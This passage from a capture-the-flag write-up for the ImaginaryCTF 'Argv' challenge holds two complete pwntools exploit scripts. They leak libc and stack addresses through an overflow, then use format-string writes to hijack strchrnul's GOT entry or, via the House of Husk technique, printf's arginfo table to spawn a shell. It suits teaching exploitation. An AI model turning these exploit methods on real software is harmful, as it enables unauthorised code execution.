-</span></span><span style=display:flex><span><span style=color:#e06c75>system</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;system&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>puts</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;puts&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>exit_fn</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;exit&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>binsh</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>next</span>(<span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>search</span>(<span style=color:#98c379>b</span><span style=color:#98c379>&#39;/bin/sh</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#39;</span>))
-</span></span><span style=display:flex><span><span style=color:#e06c75>environ</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sym</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>environ</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Leaked gets got address: &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>gets_leak</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Libc_addr base address at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found system at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>system</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found puts at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>puts</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found exit_fn at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>exit_fn</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found shell at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>binsh</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found environ at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>environ</span>)))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 2: Leak stack addresses&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;A&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>environ</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>stack_leak</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>int</span>((<span style=color:#e06c75>u64</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>(<span style=color:#d19a66>0x8</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>ljust</span>(<span style=color:#d19a66>8</span>,<span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>))))
-</span></span><span style=display:flex><span><span style=color:#e06c75>buffer_start</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>stack_leak</span> <span style=color:#56b6c2>-</span> <span style=color:#d19a66>0x178</span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Leaked stack address : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>stack_leak</span>)))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 3: Buffer Overflow to Format string&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Buffer starts at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>buffer_start</span>)))
-</span></span><span style=display:flex><span><span style=color:#7f848e># Null out the stack for better visibility on our writes</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>buffer_start</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 4: Arbitrary write&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>libc_got</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>0x21a000</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>strlen_got</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc_got</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>0x98</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>strchrnul_got</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc_got</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>0x98</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>32</span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found libc_got at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>libc_got</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found strlen got address  at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>strlen_got</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found strchrnul got address  at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>strchrnul_got</span>)))
-</span></span><span style=display:flex><span><span style=color:#e06c75>write_64</span>(<span style=color:#e06c75>strchrnul_got</span>,<span style=color:#e06c75>system</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>() <span style=color:#7f848e># Receive the garbage data returned</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 5: Spawning shell&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#98c379>b</span><span style=color:#98c379>&#34;/bin/sh</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>interactive</span>()
-</span></span><span style=display:flex><span><span style=color:#e06c75>exit</span>()
-</span></span></code></pre></div><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241110220811.png alt></p><h3 id=method-2-house-of-husk>Method 2: House of Husk</h3><p>It is also possible to solve this challenge using the House of Husk Technique. We can create a fake structure and point <code>__printf_arginfo_table</code> to the start of the fake structure while overwriting <code>__printf_arginfo_table</code> with our forged pointer to a custom function/one gadget. We also need to ensure the value of <code>__printf_function_table</code> is not NULL and is set it to 1. So to trigger our exploit we just need to make a call to printf() with the format specifier that we have targeted. More information about this technique can be found <a href=https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507 target=_blank>here</a>.</p><div class=highlight><pre tabindex=0 style=color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-python data-lang=python><span style=display:flex><span><span style=color:#7f848e>#!/usr/bin/env python</span>
-</span></span><span style=display:flex><span><span style=color:#7f848e># -*- coding: utf-8 -*-</span>
-</span></span><span style=display:flex><span><span style=color:#c678dd>from</span> <span style=color:#e06c75>pwn</span> <span style=color:#c678dd>import</span> <span style=color:#56b6c2>*</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>filename</span> <span style=color:#56b6c2>=</span> <span style=color:#98c379>&#39;./argv&#39;</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>ELF</span>(<span style=color:#98c379>&#34;/lib/x86_64-linux-gnu/libc.so.6&#34;</span>,<span style=color:#e06c75>checksec</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>False</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>e</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>elf</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>ELF</span>(<span style=color:#e06c75>filename</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>process</span>(<span style=color:#e06c75>filename</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>main</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>elf</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sym</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>main</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#c678dd>def</span> <span style=color:#61afef;font-weight:700>write_64</span>(<span style=color:#e06c75>write_location</span>,<span style=color:#e06c75>write_value</span>):
-</span></span><span style=display:flex><span>	<span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>fmtstr_payload</span>(<span style=color:#d19a66>8</span>,{ <span style=color:#7f848e># injection == 8</span>
-</span></span><span style=display:flex><span>		<span style=color:#e06c75>write_location</span>:<span style=color:#e06c75>write_value</span>
-</span></span><span style=display:flex><span>	})
-</span></span><span style=display:flex><span>	<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 1: Leak libc addresses&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;A&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>elf</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>got</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>gets</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>gets_leak</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>int</span>((<span style=color:#e06c75>u64</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>(<span style=color:#d19a66>0x8</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>ljust</span>(<span style=color:#d19a66>8</span>,<span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>)))) 
-</span></span><span style=display:flex><span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>gets_leak</span> <span style=color:#56b6c2>-</span> <span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sym</span>[<span style=color:#98c379>&#39;gets&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>system</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;system&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>puts</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;puts&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>exit_fn</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>symbols</span>[<span style=color:#98c379>&#39;exit&#39;</span>]
-</span></span><span style=display:flex><span><span style=color:#e06c75>binsh</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>next</span>(<span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>search</span>(<span style=color:#98c379>b</span><span style=color:#98c379>&#39;/bin/sh</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#39;</span>))
-</span></span><span style=display:flex><span><span style=color:#e06c75>environ</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sym</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>environ</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Leaked gets got address: &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>gets_leak</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Libc_addr base address at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found system at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>system</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found puts at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>puts</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found exit_fn at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>exit_fn</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found shell at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>binsh</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found environ at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>environ</span>)))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 2: Leak stack addresses&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;A&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>environ</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span><span style=color:#c678dd>try</span>:
-</span></span><span style=display:flex><span>	<span style=color:#e06c75>stack_leak</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>int</span>((<span style=color:#e06c75>u64</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>(<span style=color:#d19a66>0x8</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>ljust</span>(<span style=color:#d19a66>8</span>,<span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>))))
-</span></span><span style=display:flex><span><span style=color:#c678dd>except</span>:
-</span></span><span style=display:flex><span>	<span style=color:#e06c75>stack_leak</span><span style=color:#56b6c2>=</span><span style=color:#e5c07b>int</span>((<span style=color:#e06c75>u64</span>(<span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>(<span style=color:#d19a66>0x8</span>)<span style=color:#56b6c2>.</span><span style=color:#e06c75>ljust</span>(<span style=color:#d19a66>8</span>,<span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span>))))
-</span></span><span style=display:flex><span><span style=color:#e06c75>buffer_start</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>stack_leak</span> <span style=color:#56b6c2>-</span> <span style=color:#d19a66>0x178</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Leaked stack address : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>stack_leak</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Buffer starts at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>buffer_start</span>)))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 3: Format string&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>arginfo_table</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>0x21b8b0</span><span style=color:#7f848e># == structure containing forged pointer</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>function_table</span><span style=color:#56b6c2>=</span><span style=color:#e06c75>libc</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>address</span> <span style=color:#56b6c2>+</span> <span style=color:#d19a66>0x21c9c8</span> <span style=color:#7f848e># == NOT NULL</span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found __printf_arginfo_table at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>arginfo_table</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Found __printf_function_table at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>function_table</span>)))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\n</span><span style=color:#98c379>[*] Stage 4: Arbitrary write&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#98c379>b</span><span style=color:#98c379>&#34;&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#98c379>b</span><span style=color:#98c379>&#34;&#34;</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#7f848e># Convert this issue into a format string vulnerability</span>
-</span></span><span style=display:flex><span><span style=color:#7f848e># Null out the stack for better visibility on our writes</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>buffer_start</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#7f848e># start writing on the stack</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>fake_structure</span> <span style=color:#56b6c2>=</span> <span style=color:#e06c75>buffer_start</span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Create fake structure starting at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>fake_structure</span>)))
-</span></span><span style=display:flex><span><span style=color:#e06c75>fake_structure_pointer</span><span style=color:#56b6c2>=</span> <span style=color:#e06c75>buffer_start</span><span style=color:#56b6c2>+</span><span style=color:#d19a66>504</span> <span style=color:#7f848e># where system will be written</span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Create fake structure pointer at : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>fake_structure_pointer</span>)))
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>&#34;[+] Write system to the fake structure pointer : &#34;</span> <span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>fake_structure_pointer</span>)))
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>write_64</span>(<span style=color:#e06c75>fake_structure_pointer</span>,<span style=color:#e06c75>system</span>)
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[*] Point __printf_arginfo_table to the start of the fake structure i.e </span><span style=color:#98c379>{</span><span style=color:#e5c07b>str</span>(<span style=color:#e5c07b>hex</span>(<span style=color:#e06c75>fake_structure</span>))<span style=color:#98c379>}</span><span style=color:#98c379>&#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>write_64</span>(<span style=color:#e06c75>arginfo_table</span>,<span style=color:#e06c75>buffer_start</span>) <span style=color:#7f848e># tell arginfo_table to use our fake structure, which starts at buffer_start</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e5c07b>print</span>(<span style=color:#98c379>f</span><span style=color:#98c379>&#34;[*] Set __printf_function_table to 1 &#34;</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>write_64</span>(<span style=color:#e06c75>function_table</span>,<span style=color:#e06c75>p64</span>(<span style=color:#d19a66>1</span>)) <span style=color:#7f848e># ensure __printf_function_table is not NULL</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>payload</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;</span><span style=color:#98c379>\x00</span><span style=color:#98c379>&#34;</span> <span style=color:#56b6c2>*</span> (<span style=color:#d19a66>360</span>) <span style=color:#56b6c2>+</span> <span style=color:#e06c75>p64</span>(<span style=color:#e06c75>buffer_start</span>) <span style=color:#7f848e># Convert this issue into a format string vulnerability</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>payload</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>recv</span>() <span style=color:#7f848e># Receive garbage data</span>
-</span></span><span style=display:flex><span>
-</span></span><span style=display:flex><span><span style=color:#7f848e># Trigger shell</span>
-</span></span><span style=display:flex><span><span style=color:#e06c75>shell</span><span style=color:#56b6c2>=</span><span style=color:#98c379>b</span><span style=color:#98c379>&#34;%.&#34;</span><span style=color:#56b6c2>+</span> <span style=color:#e5c07b>str</span>(<span style=color:#e06c75>u16</span>(<span style=color:#98c379>b</span><span style=color:#98c379>&#39;sh&#39;</span>))<span style=color:#56b6c2>.</span><span style=color:#e06c75>encode</span>() <span style=color:#56b6c2>+</span> <span style=color:#98c379>b</span><span style=color:#98c379>&#34;?&#34;</span>  
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>sendline</span>(<span style=color:#e06c75>shell</span>)
-</span></span><span style=display:flex><span><span style=color:#e06c75>target</span><span style=color:#56b6c2>.</span><span style=color:#e06c75>interactive</span>()
-</span></span></code></pre></div><p><img src=/images/ImaginaryCTF_-_Argv/Pasted_20241111201745.png alt></p><h3 id=references>References</h3><ul><li><a href=https://linux.die.net/man/3/strchrnul target=_blank>https://linux.die.net/man/3/strchrnul</a></li><li><a href=https://maxwelldulin.com/BlogPost/House-of-Husk-In-Depth-Explanation target=_blank>https://maxwelldulin.com/BlogPost/House-of-Husk-In-Depth-Explanation</a></li><li><a href=https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507 target=_blank>https://ptr-yudai.hatenablog.com/entry/2020/04/02/111507</a></li></ul></div><div class="row items-start justify-between"><div class="lg:col-6 mb-10 flex items-center lg:mb-0"><h5 class=mr-3>Tags :</h5><ul><li class=inline-block><a class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white" href=/tags/linux/>Linux</a></li><li class=inline-block><a class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 hover:text-white" href=/tags/formatstring/>Format string</a></li><li class=inline-block><a class="bg-light hover:bg-primary dark:bg-darkmode-light dark:hover:bg-darkmode-primary dark:hover:text-text-dark m-1 block rounded px-3 py-1 